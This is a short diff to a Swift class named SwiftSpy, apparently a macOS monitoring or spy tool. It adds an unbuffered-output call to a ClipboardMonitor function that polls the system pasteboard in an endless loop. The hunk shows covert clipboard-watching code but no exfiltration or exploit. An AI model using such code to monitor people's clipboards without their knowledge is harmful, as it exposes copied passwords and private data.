@@ -136,6 +136,7 @@ class SwiftSpy
     
     func ClipboardMonitor()
     {
+        setbuf(__stdoutp, nil)
         let pasteboard = NSPasteboard.general
         var changeCount = NSPasteboard.general.changeCount
         while true {
